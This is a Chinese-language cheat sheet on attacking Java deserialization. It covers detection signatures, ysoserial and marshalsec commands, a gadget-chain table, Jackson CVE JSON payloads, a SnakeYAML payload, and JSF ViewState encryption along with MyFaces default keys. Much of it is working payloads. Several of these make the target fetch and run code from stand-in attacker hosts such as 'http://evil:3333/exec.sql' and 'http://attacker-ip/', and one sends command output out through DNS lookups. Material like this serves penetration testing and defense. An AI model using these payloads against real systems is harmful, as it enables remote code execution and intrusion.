[原文文档](Java.en.md)

# Java 反序列化

> Java 序列化是将 Java 对象的状态转换为字节流的过程，该字节流可以存储或传输，然后稍后重建（反序列化）回原始对象。Java 中的序列化主要使用 `Serializable` 接口完成，该接口将类标记为可序列化，允许将其保存到文件、通过网络发送或在 JVM 之间传输。

## 摘要

* [检测](#检测)
* [工具](#工具)
    * [Ysoserial](#ysoserial)
    * [使用 ysoserial 的 Burp 扩展](#burp-扩展)
    * [替代工具](#替代工具)
* [YAML 反序列化](#yaml-反序列化)
* [ViewState](#viewstate)
* [参考资料](#参考资料)

## 检测

* `"AC ED 00 05"` 十六进制
    * `AC ED`: STREAM_MAGIC。指定这是序列化协议。
    * `00 05`: STREAM_VERSION。序列化版本。
* `"rO0"` Base64
* `Content-Type` = "application/x-java-serialized-object"
* `"H4sIAAAAAAAAAJ"` gzip(base64)

## 工具

### Ysoserial

[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : 一个概念验证工具，用于生成利用不安全 Java 对象反序列化的有效载荷。

```java
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

**ysoserial 中包含的有效载荷列表：**

| 有效载荷             | 作者                                | 依赖项 |
| ------------------- | -------------------------------------- | --- |
| AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2 |
| BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5 |
| C3P0                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |
| Click1              | @artsploit                             | click-nodeps:2.3.0, javax.servlet-api:3.1.0 |
| Clojure             | @JackOfMostTrades                      | clojure:1.8.0 |
| CommonsBeanutils1   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |
| CommonsCollections1 | @frohoff                               | commons-collections:3.1 |
| CommonsCollections2 | @frohoff                               | commons-collections4:4.0 |
| CommonsCollections3 | @frohoff                               | commons-collections:3.1 |
| CommonsCollections4 | @frohoff                               | commons-collections4:4.0 |
| CommonsCollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1  |
| CommonsCollections6 | @matthias_kaiser                       | commons-collections:3.1  |
| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1  |
| FileUpload1         | @mbechler                              | commons-fileupload:1.3.1, commons-io:2.4|
| Groovy1             | @frohoff                               | groovy:2.3.9            |
| Hibernate1          | @mbechler                              | |
| Hibernate2          | @mbechler                              | |
| JBossInterceptors1  | @matthias_kaiser                       | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| JRMPClient          | @mbechler                              | |
| JRMPListener        | @mbechler                              | |
| JSON1               | @mbechler                              | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
| JavassistWeld1      | @matthias_kaiser                       | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| Jdk7u21             | @frohoff                               | |
| Jython1             | @pwntester, @cschneider4711            | jython-standalone:2.5.2 |
| MozillaRhino1       | @matthias_kaiser                       | js:1.7R2 |
| MozillaRhino2       | @_tint0                                | js:1.7R2 |
| Myfaces1            | @mbechler                              | |
| Myfaces2            | @mbechler                              | |
| ROME                | @mbechler                              | rome:1.0 |
| Spring1             | @frohoff                               | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE |
| Spring2             | @mbechler                              | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 |
| URLDNS              | @gebl                                  | |
| Vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
| Wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4 |

### Burp 扩展

* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) - 执行 Java 反序列化攻击的 Burp 扩展
* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) - 用于 Burp Suite 的一体化插件，用于检测和利用 Java 反序列化漏洞
* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) - 与 Burp Suite 集成的 YSOSERIAL
* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java 反序列化漏洞识别
* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java 反序列化漏洞主动识别 Burp 扩展器

### 替代工具

* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - 纯 JRE 8 RCE 反序列化小工具
* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss（和其他 Java 反序列化漏洞）验证和利用工具
* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - 原始 ysoserial 应用程序的分支
* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java 序列化暴力破解攻击工具
* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - 以更易读的形式转储 Java 序列化流的工具
* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - 利用反序列化暴力破解远程类路径
* [k3idii/Deserek](https://github.com/k3idii/Deserek) - 用于序列化和反序列化 java 二进制序列化格式的 Python 代码。

  ```java
  java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
  python deserek.py yss_base.bin --format python > yss_url.py
  python yss_url.py yss_new.bin
  java -cp JavaSerializationTestSuite DeSerial yss_new.bin
  ```

* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java 反序列化器安全 - 将您的数据转化为代码执行

  ```java
  $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
  // -a - 为该反序列化器生成/测试所有有效载荷
  // -t - 在测试模式下运行，在生成它们后反序列化生成的有效载荷。
  // -v - 详细模式，例如在测试模式下也显示生成的有效载荷。
  // gadget_type - 特定小工具的标识符，如果省略将显示该特定反序列化器的可用小工具。
  // arguments - 小工具特定参数
  ```

包含以下反序列化器的有效载荷生成器：

| 反序列化器                      | 小工具影响                                |
| ------------------------------- | ---------------------------------------------- |
| BlazeDSAMF(0&#124;3&#124;X)     | JDK 仅升级到 Java 序列化各种第三方库 RCE |
| Hessian&#124;Burlap             | 各种第三方 RCE |
| Castor                          | 依赖库 RCE |
| Jackson                         | **可能的 JDK 仅 RCE**，各种第三方 RCE |
| Java                            | 又一个第三方 RCE |
| JsonIO                          | **JDK 仅 RCE** |
| JYAML                           | **JDK 仅 RCE** |
| Kryo                            | 第三方 RCE |
| KryoAltStrategy                 | **JDK 仅 RCE** |
| Red5AMF(0&#124;3)               | **JDK 仅 RCE** |
| SnakeYAML                       | **JDK 仅 RCE** |
| XStream                         | **JDK 仅 RCE** |
| YAMLBeans                       | 第三方 RCE |

## JSON 反序列化

可以使用多个库来处理 Java 中的 JSON。

* [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)
* [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
* [Fastjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#fastjson-json)
* [Genson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)
* [Flexjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#flexjson-json)
* [Jodd](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jodd-json)

**Jackson**:

Jackson 是一个流行的 Java 库，用于处理 JSON (JavaScript Object Notation) 数据。
Jackson-databind 支持多态类型处理 (PTH)，以前称为"多态反序列化"，默认情况下是禁用的。

要确定后端是否使用 Jackson，最常见的技术是发送无效的 JSON 并检查错误消息。查找对以下任一内容的引用：

```java
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

* com.fasterxml.jackson.databind
* org.codehaus.jackson.map

**利用**:

* **CVE-2017-7525**

  ```json
  {
    "param": [
      "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
      {
        "transletBytecodes": [
          "yv66v[JAVA_CLASS_B64_ENCODED]AIAEw=="
        ],
        "transletName": "a.b",
        "outputProperties": {}
      }
    ]
  }
    ```

* **CVE-2017-17485**

  ```json
  {
    "param": [
      "org.springframework.context.support.FileSystemXmlApplicationContext",
      "http://evil/spel.xml"
    ]
  }
  ```

* **CVE-2019-12384**

  ```json
  [
    "ch.qos.logback.core.db.DriverManagerConnectionSource", 
    {
      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"
    }
  ]
  ```

* **CVE-2020-36180**

  ```json
  [
    "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
    {
      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'"
    }
  ]
  ```

* **CVE-2020-9548**

    ```json
    [
      "br.com.anteros.dbcp.AnterosDBCPConfig",
      {
        "healthCheckRegistry": "ldap://{{interactsh-url}}"
      }
    ]
    ```

## YAML 反序列化

* [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)
* [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)
* [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)

**SnakeYAML**:

SnakeYAML 是一个流行的基于 Java 的库，用于解析和发出 YAML (YAML Ain't Markup Language) 数据。它为处理 YAML 提供了一个易于使用的 API，YAML 是一种人类可读的数据序列化标准，通常用于配置文件和数据交换。

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

## ViewState

在 Java 中，ViewState 指的是 JavaServer Faces (JSF) 等框架用于在 Web 应用程序中的 HTTP 请求之间维护 UI 组件状态的机制。有 2 个主要实现：

* Oracle Mojarra (JSF 参考实现)
* Apache MyFaces

**工具**:

* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss：JBoss（和 Java 反序列化漏洞）验证和利用工具
* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace 是一个用于修补未加密和未签名 JSF ViewState 的软件。

### 编码

| 编码      | 开始于 |
| ------------- | ----------- |
| base64        | `rO0`       |
| base64 + gzip | `H4sIAAA`   |

### 存储

`javax.faces.STATE_SAVING_METHOD` 是 JavaServer Faces (JSF) 中的一个配置参数。它指定框架应如何在 HTTP 请求之间保存组件树（页面上 UI 组件的结构和数据）的状态。

还可以从 HTML 正文中的 viewstate 表示推断存储方法。

* **服务器端**存储: `value="-XXX:-XXXX"`
* **客户端**存储: `base64 + gzip + Java 对象`

### 加密

默认情况下，MyFaces 使用 DES 作为加密算法，使用 HMAC-SHA1 来验证 ViewState。可以并且建议配置更 recent 的算法，如 AES 和 HMAC-SHA256。

| 加密算法 | HMAC        |
| -------------------- | ----------- |
| DES ECB (默认)    | HMAC-SHA1   |

支持的加密方法是 BlowFish、3DES、AES，并由上下文参数定义。
这些参数的值及其秘密可以在这些 XML 子句中找到。

```xml
<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   
<param-name>org.apache.myfaces.SECRET</param-name>   
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
```

来自[文档](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application)的常见密钥。

| 名称                 | 值                              |
| -------------------- | ---------------------------------- |
| AES CBC/PKCS5Padding | `NzY1NDMyMTA3NjU0MzIxMA==`         |
| DES                  | `NzY1NDMyMTA=<`                    |
| DESede               | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| Blowfish             | `NzY1NDMyMTA3NjU0MzIxMA`           |
| AES CBC              | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| AES CBC IV           | `NzY1NDMyMTA3NjU0MzIxMA==`         |

* **加密**: 数据 -> 加密 -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState
* **解密**: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> 解密 -> 数据

## 参考资料

* [使用 DNS 渗出检测反序列化错误 - Philippe Arteau - 2017 年 3 月 22 日](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
* [利用 Jackson RCE：CVE-2017-7525 - Adam Caudill - 2017 年 10 月 4 日](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)
* [Hack The Box - Arkham - 0xRick - 2019 年 8 月 10 日](https://0xrick.github.io/hack-the-box/arkham/)
* [我如何找到一个价值 1500 美元的反序列化漏洞 - Ashish Kunwar - 2018 年 8 月 28 日](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
* [Jackson CVE-2019-12384：漏洞类别的剖析 - Andrea Brancaleoni - 2019 年 7 月 22 日](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
* [Jackson 小工具 - 漏洞的剖析 - Andrea Brancaleoni - 2019 年 7 月 22 日](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
* [Jackson 多态反序列化 - FasterXML - 2020 年 7 月 23 日](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)
* [Java 反序列化备忘单 - Aleksei Tiurin - 2023 年 5 月 23 日](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
* [ViewState 中的 Java 反序列化 - Haboob Team - 2020 年 12 月 23 日](https://www.exploit-db.com/docs/48126)
* [JSF ViewState 颠倒 - Renaud Dubourguais, Nicolas Collignon - 2016 年 3 月 15 日](https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
* [错误配置的 JSF ViewState 可能导致严重的 RCE 漏洞 - Peter Stöckli - 2017 年 8 月 14 日](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
* [关于 Jackson CVE：不要恐慌——这是您需要知道的 - cowtowncoder - 2017 年 12 月 22 日](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)
* [ForgeRock OpenAM 中的预认证 RCE（CVE-2021-35464）- Michael Stepankin (@artsploit) - 2021 年 6 月 29 日](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
* [使用 Java 反序列化触发 DNS 查找 - paranoidsoftware.com - 2020 年 7 月 5 日](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* [理解和实践 java 反序列化利用 - Diablohorn - 2017 年 9 月 9 日](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
* [星期五 13 日 JSON 攻击 - Alvaro Muñoz & Oleksandr Mirosh - 2017 年 7 月 28 日](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)